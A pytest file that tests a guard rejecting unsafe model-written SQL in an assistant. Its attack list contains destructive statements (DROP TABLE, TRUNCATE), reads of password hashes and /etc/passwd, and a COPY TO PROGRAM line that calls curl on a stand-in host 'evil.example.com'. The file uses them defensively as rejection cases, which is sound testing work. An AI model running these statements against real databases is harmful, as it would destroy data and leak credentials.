"""The SQL guard, attacked.

Every case here is SQL a model could be talked into writing - by a prompt in a
question, by a sanction record whose name is an instruction, or by being
confused. The guard is the first of two defences; the read-only role it runs as
is the second, and `tests/integration/test_assistant.py` proves that one
against the database.
"""

from __future__ import annotations

import pytest

from concordance.assistant.guard import DEFAULT_LIMIT, MAX_LIMIT, SqlRejectedError, check

#: (what it tries, the SQL, the refusal code expected)
ATTACKS: list[tuple[str, str, str]] = [
    ("drop a table", "DROP TABLE users", "not_a_select"),
    ("delete rows", "DELETE FROM cases WHERE 1=1", "not_a_select"),
    ("insert a row", "INSERT INTO users (email) VALUES ('x@y.z')", "not_a_select"),
    ("update a row", "UPDATE match_results SET decision = 'MATCH'", "not_a_select"),
    ("truncate", "TRUNCATE TABLE audit_logs", "not_a_select"),
    ("grant itself rights", "GRANT ALL ON users TO PUBLIC", "not_a_select"),
    ("create a view over a real table", "CREATE VIEW leak AS SELECT * FROM users", "not_a_select"),
    ("alter a table", "ALTER TABLE users DROP COLUMN password_hash", "not_a_select"),
    ("a second statement", "SELECT 1 FROM assistant_matches; DROP TABLE cases", "multiple"),
    ("a second statement behind a comment", "SELECT 1 FROM assistant_matches --; DROP TABLE cases", "comment"),
    ("a block comment", "SELECT 1 /* nothing to see */ FROM assistant_matches", "comment"),
    ("read the user table", "SELECT email, password_hash FROM users", "forbidden_table"),
    ("read refresh tokens", "SELECT * FROM refresh_tokens", "forbidden_table"),
    ("read the audit log", "SELECT * FROM audit_logs", "forbidden_table"),
    ("read raw LLM calls", "SELECT request, response FROM llm_calls", "forbidden_table"),
    ("qualify with public", "SELECT * FROM public.users", "forbidden_table"),
    ("read the catalogue", "SELECT * FROM pg_catalog.pg_tables", "forbidden_table"),
    ("read information_schema", "SELECT table_name FROM information_schema.columns", "forbidden_table"),
    ("quote the identifier", 'SELECT * FROM "users"', "forbidden_table"),
    ("hide it in a CTE", "WITH x AS (SELECT * FROM users) SELECT * FROM x", "forbidden_table"),
    (
        "hide it in a scalar subquery",
        "SELECT (SELECT password_hash FROM users LIMIT 1) FROM assistant_matches",
        "forbidden_table",
    ),
    (
        "hide it in a join",
        "SELECT * FROM assistant_matches JOIN users ON TRUE",
        "forbidden_table",
    ),
    (
        "hide it in a union",
        "SELECT record_id FROM assistant_matches UNION ALL SELECT email FROM users",
        "forbidden_table",
    ),
    (
        "hide it in an IN clause",
        "SELECT * FROM assistant_matches WHERE record_id IN (SELECT email FROM users)",
        "forbidden_table",
    ),
    ("sleep", "SELECT pg_sleep(30) FROM assistant_matches", "forbidden_function"),
    ("read a file", "SELECT pg_read_file('/etc/passwd') FROM assistant_matches", "forbidden_function"),
    ("large object import", "SELECT lo_import('/etc/passwd') FROM assistant_matches", "forbidden_function"),
    ("reach the network", "SELECT dblink('host=evil', 'SELECT 1') FROM assistant_matches", "forbidden_function"),
    ("read a setting", "SELECT current_setting('data_directory') FROM assistant_matches", "forbidden_function"),
    ("name the role", "SELECT current_user FROM assistant_matches", "forbidden_function"),
    ("fingerprint the server", "SELECT version() FROM assistant_matches", "forbidden_function"),
    ("write a table out", "SELECT * INTO leaked FROM assistant_matches", "forbidden_statement"),
    ("lock rows", "SELECT * FROM assistant_matches FOR UPDATE", "forbidden_statement"),
    ("change a setting", "SET statement_timeout = 0", "not_a_select"),
    ("open a transaction", "BEGIN", "not_a_select"),
    ("copy to a program", "COPY assistant_matches TO PROGRAM 'curl evil.example.com'", "not_a_select"),
    ("call a procedure", "CALL something()", "not_a_select"),
    ("bind a parameter", "SELECT * FROM assistant_matches WHERE state = $1", "forbidden_statement"),
    ("read no view at all", "SELECT 1", "no_table"),
    ("send nothing", "   ", "empty"),
    ("send prose", "I'm sorry, I cannot help with that request.", "unparsable"),
]


@pytest.mark.parametrize(("intent", "sql", "code"), ATTACKS, ids=[a[0] for a in ATTACKS])
def test_the_guard_refuses(intent: str, sql: str, code: str) -> None:
    with pytest.raises(SqlRejectedError) as refused:
        check(sql)
    assert refused.value.code == code, f"{intent}: {refused.value.reason}"
    assert refused.value.reason, "a refusal must say why; the page shows it"


ALLOWED = [
    "SELECT * FROM assistant_matches WHERE decision = 'MATCH'",
    "SELECT decision, COUNT(*) FROM assistant_matches GROUP BY decision ORDER BY 2 DESC",
    "select * from ASSISTANT_CASES where status = 'ACTIVE'",
    "WITH m AS (SELECT * FROM assistant_matches) SELECT COUNT(*) FROM m",
    "SELECT state, AVG(confidence) FROM assistant_matches GROUP BY state HAVING COUNT(*) > 5",
    "SELECT r.config_version, r.matched_count FROM assistant_runs AS r ORDER BY r.started_at DESC",
    "SELECT record_id FROM assistant_sanctions EXCEPT SELECT record_id FROM assistant_matches",
    "SELECT p.full_name FROM assistant_providers p JOIN assistant_matches m ON m.provider_id = p.provider_id",
]


@pytest.mark.parametrize("sql", ALLOWED)
def test_an_honest_question_passes(sql: str) -> None:
    safe = check(sql)
    assert safe.sql
    assert safe.tables <= {
        "assistant_matches",
        "assistant_cases",
        "assistant_providers",
        "assistant_sanctions",
        "assistant_runs",
    }
    assert safe.limit <= MAX_LIMIT


def test_a_missing_limit_is_added_and_a_huge_one_is_lowered() -> None:
    added = check("SELECT * FROM assistant_matches")
    assert added.limit == DEFAULT_LIMIT
    assert f"LIMIT {DEFAULT_LIMIT}" in added.sql
    assert added.notes == (f"a LIMIT of {DEFAULT_LIMIT} was added",)

    lowered = check("SELECT * FROM assistant_matches LIMIT 50000")
    assert lowered.limit == MAX_LIMIT
    assert "50000" not in lowered.sql
    assert lowered.notes and "lowered" in lowered.notes[0]

    kept = check("SELECT * FROM assistant_matches LIMIT 10")
    assert kept.limit == 10
    assert kept.notes == ()


def test_what_runs_is_what_the_guard_printed_not_what_the_model_wrote() -> None:
    """The regenerated SQL is the defence: nothing unparsed survives into it."""
    safe = check("sElEcT    decision ,   count(*)  FROM   assistant_matches  GROUP  BY 1")
    assert safe.sql == "SELECT decision, COUNT(*) FROM assistant_matches GROUP BY 1 LIMIT 200"


def test_the_whitelist_is_the_one_the_views_module_declares() -> None:
    from concordance.assistant.views import ALLOWED_VIEWS, VIEWS

    assert {v.name for v in VIEWS} == set(ALLOWED_VIEWS)
    assert all(v.columns and v.about for v in VIEWS)
